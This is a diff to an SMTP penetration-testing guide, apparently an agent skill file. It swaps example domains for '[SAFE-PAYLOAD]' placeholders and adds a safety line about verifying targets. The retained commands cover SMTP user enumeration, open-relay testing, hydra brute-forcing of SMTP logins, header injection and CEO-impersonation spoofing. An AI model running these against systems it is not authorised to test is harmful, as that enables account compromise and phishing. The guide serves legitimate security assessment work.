@@ -78,9 +78,9 @@ nmap -sV -sC -p 25 TARGET_IP
 nmap --script=smtp-* -p 25 TARGET_IP
 
 # Discover MX records for domain
-dig MX target.com
-nslookup -type=mx target.com
-host -t mx target.com
+dig MX [SAFE-PAYLOAD]
+nslookup -type=mx [SAFE-PAYLOAD]
+host -t mx [SAFE-PAYLOAD]
 ```
 
 ### Phase 3: Banner Grabbing
@@ -90,11 +90,11 @@ Retrieve SMTP server information:
 ```bash
 # Using Telnet
 telnet TARGET_IP 25
-# Response: 220 mail.target.com ESMTP Postfix
+# Response: 220 mail.[SAFE-PAYLOAD] ESMTP Postfix
 
 # Using Netcat
 nc TARGET_IP 25
-# Response: 220 mail.target.com ESMTP
+# Response: 220 mail.[SAFE-PAYLOAD] ESMTP
 
 # Using Nmap
 nmap -sV -p 25 TARGET_IP
@@ -124,10 +124,10 @@ Test available SMTP commands:
 nc TARGET_IP 25
 
 # Initial greeting
-EHLO attacker.com
+EHLO [SAFE-PAYLOAD]
 
 # Response shows capabilities:
-250-mail.target.com
+250-mail.[SAFE-PAYLOAD]
 250-PIPELINING
 250-SIZE 10240000
 250-VRFY
@@ -143,16 +143,16 @@ Key commands to test:
 ```bash
 # VRFY - Verify user exists
 VRFY admin
-250 2.1.5 admin@target.com
+250 2.1.5 admin@[SAFE-PAYLOAD]
 
 # EXPN - Expand mailing list
 EXPN staff
-250 2.1.5 user1@target.com
-250 2.1.5 user2@target.com
+250 2.1.5 user1@[SAFE-PAYLOAD]
+250 2.1.5 user2@[SAFE-PAYLOAD]
 
 # RCPT TO - Recipient verification
-MAIL FROM:<test@attacker.com>
-RCPT TO:<admin@target.com>
+MAIL FROM:<test@[SAFE-PAYLOAD]>
+RCPT TO:<admin@[SAFE-PAYLOAD]>
 # 250 OK = user exists
 # 550 = user doesn't exist
 ```
@@ -172,7 +172,7 @@ smtp-user-enum -M EXPN -U /usr/share/wordlists/users.txt -t TARGET_IP
 smtp-user-enum -M RCPT -U /usr/share/wordlists/users.txt -t TARGET_IP
 
 # Specify port and domain
-smtp-user-enum -M VRFY -U users.txt -t TARGET_IP -p 25 -d target.com
+smtp-user-enum -M VRFY -U users.txt -t TARGET_IP -p 25 -d [SAFE-PAYLOAD]
 ```
 
 Using Metasploit:
@@ -205,9 +205,9 @@ nmap -p 25 --script smtp-open-relay TARGET_IP
 
 # Manual testing via Telnet
 telnet TARGET_IP 25
-HELO attacker.com
-MAIL FROM:<test@attacker.com>
-RCPT TO:<victim@external-domain.com>
+HELO [SAFE-PAYLOAD]
+MAIL FROM:<test@[SAFE-PAYLOAD]>
+RCPT TO:<victim@[SAFE-PAYLOAD]>
 DATA
 Subject: Relay Test
 This is a test.
@@ -230,12 +230,12 @@ Test variations:
 ```bash
 # Test different sender/recipient combinations
 MAIL FROM:<>
-MAIL FROM:<test@[attacker_IP]>
-MAIL FROM:<test@target.com>
+MAIL FROM:<test@[SAFE-PAYLOAD]>
+MAIL FROM:<test@[SAFE-PAYLOAD]>
 
-RCPT TO:<test@external.com>
-RCPT TO:<"test@external.com">
-RCPT TO:<test%external.com@target.com>
+RCPT TO:<test@[SAFE-PAYLOAD]>
+RCPT TO:<"test@[SAFE-PAYLOAD]">
+RCPT TO:<test%[SAFE-PAYLOAD]@[SAFE-PAYLOAD]>
 ```
 
 ### Phase 7: Brute Force Authentication
@@ -279,11 +279,11 @@ Test for command injection vulnerabilities:
 
 ```bash
 # Header injection test
-MAIL FROM:<attacker@test.com>
-RCPT TO:<victim@target.com>
+MAIL FROM:<attacker@[SAFE-PAYLOAD]>
+RCPT TO:<victim@[SAFE-PAYLOAD]>
 DATA
 Subject: Test
-Bcc: hidden@attacker.com
+Bcc: hidden@[SAFE-PAYLOAD]
 X-Injected: malicious-header
 
 Injected content
@@ -294,10 +294,10 @@ Email spoofing test:
 
 ```bash
 # Spoofed sender (tests SPF/DKIM protection)
-MAIL FROM:<ceo@target.com>
-RCPT TO:<employee@target.com>
+MAIL FROM:<ceo@[SAFE-PAYLOAD]>
+RCPT TO:<employee@[SAFE-PAYLOAD]>
 DATA
-From: CEO <ceo@target.com>
+From: CEO <ceo@[SAFE-PAYLOAD]>
 Subject: Urgent Request
 Please process this request immediately.
 .
@@ -324,9 +324,9 @@ Check email authentication records:
 
 ```bash
 # SPF/DKIM/DMARC record lookups
-dig TXT target.com | grep spf            # SPF
-dig TXT selector._domainkey.target.com    # DKIM
-dig TXT _dmarc.target.com                 # DMARC
+dig TXT [SAFE-PAYLOAD] | grep spf            # SPF
+dig TXT selector._domainkey.[SAFE-PAYLOAD]    # DKIM
+dig TXT _dmarc.[SAFE-PAYLOAD]                 # DMARC
 
 # SPF policy: -all = strict fail, ~all = soft fail, ?all = neutral
 ```
@@ -339,8 +339,8 @@ dig TXT _dmarc.target.com                 # DMARC
 |---------|---------|---------|
 | HELO | Identify client | `HELO client.com` |
 | EHLO | Extended HELO | `EHLO client.com` |
-| MAIL FROM | Set sender | `MAIL FROM:<sender@test.com>` |
-| RCPT TO | Set recipient | `RCPT TO:<user@target.com>` |
+| MAIL FROM | Set sender | `MAIL FROM:<sender@[SAFE-PAYLOAD]>` |
+| RCPT TO | Set recipient | `RCPT TO:<user@[SAFE-PAYLOAD]>` |
 | DATA | Start message body | `DATA` |
 | VRFY | Verify user | `VRFY admin` |
 | EXPN | Expand alias | `EXPN staff` |
@@ -407,28 +407,28 @@ dig TXT _dmarc.target.com                 # DMARC
 
 ```bash
 # Step 1: Service discovery
-nmap -sV -sC -p 25,465,587 mail.target.com
+nmap -sV -sC -p 25,465,587 mail.[SAFE-PAYLOAD]
 
 # Step 2: Banner grab
-nc mail.target.com 25
-EHLO test.com
+nc mail.[SAFE-PAYLOAD] 25
+EHLO [SAFE-PAYLOAD]
 QUIT
 
 # Step 3: User enumeration
-smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t mail.target.com
+smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t mail.[SAFE-PAYLOAD]
 
 # Step 4: Open relay test
-nmap -p 25 --script smtp-open-relay mail.target.com
+nmap -p 25 --script smtp-open-relay mail.[SAFE-PAYLOAD]
 
 # Step 5: Authentication test
-hydra -l admin -P /usr/share/wordlists/fasttrack.txt smtp://mail.target.com
+hydra -l admin -P /usr/share/wordlists/fasttrack.txt smtp://mail.[SAFE-PAYLOAD]
 
 # Step 6: TLS check
-openssl s_client -connect mail.target.com:25 -starttls smtp
+openssl s_client -connect mail.[SAFE-PAYLOAD]:25 -starttls smtp
 
 # Step 7: Check email authentication
-dig TXT target.com | grep spf
-dig TXT _dmarc.target.com
+dig TXT [SAFE-PAYLOAD] | grep spf
+dig TXT _dmarc.[SAFE-PAYLOAD]
 ```
 
 ### Example 2: User Enumeration Attack
@@ -440,7 +440,7 @@ dig TXT _dmarc.target.com
 smtp-user-enum -M VRFY -U users.txt -t 192.168.1.100 -p 25
 
 # Method 2: RCPT with timing analysis
-smtp-user-enum -M RCPT -U users.txt -t 192.168.1.100 -p 25 -d target.com
+smtp-user-enum -M RCPT -U users.txt -t 192.168.1.100 -p 25 -d [SAFE-PAYLOAD]
 
 # Method 3: Metasploit
 msfconsole
@@ -461,14 +461,14 @@ run
 
 ```bash
 # Test via Telnet
-telnet mail.target.com 25
-HELO attacker.com
-MAIL FROM:<test@attacker.com>
-RCPT TO:<test@gmail.com>
+telnet mail.[SAFE-PAYLOAD] 25
+HELO [SAFE-PAYLOAD]
+MAIL FROM:<test@[SAFE-PAYLOAD]>
+RCPT TO:<test@[SAFE-PAYLOAD]>
 # If 250 OK - VULNERABLE
 
 # Document with Nmap
-nmap -p 25 --script smtp-open-relay --script-args smtp-open-relay.from=test@attacker.com,smtp-open-relay.to=test@external.com mail.target.com
+nmap -p 25 --script smtp-open-relay --script-args smtp-open-relay.from=test@[SAFE-PAYLOAD],smtp-open-relay.to=test@[SAFE-PAYLOAD] mail.[SAFE-PAYLOAD]
 
 # Output:
 # PORT   STATE SERVICE
@@ -499,6 +499,9 @@ nmap -p 25 --script smtp-open-relay --script-args smtp-open-relay.from=test@atta
 8. **Log Monitoring** - Alert on suspicious activity
 9. **Patch Management** - Keep SMTP software updated
 10. **Access Controls** - Restrict SMTP to authorized IPs
+
+## Safety Disclaimer
+Ask the user to verify the target URL/IP before running any security tests or exploit commands.
 
 ## When to Use
 This skill is applicable to execute the workflow or actions described in the overview.
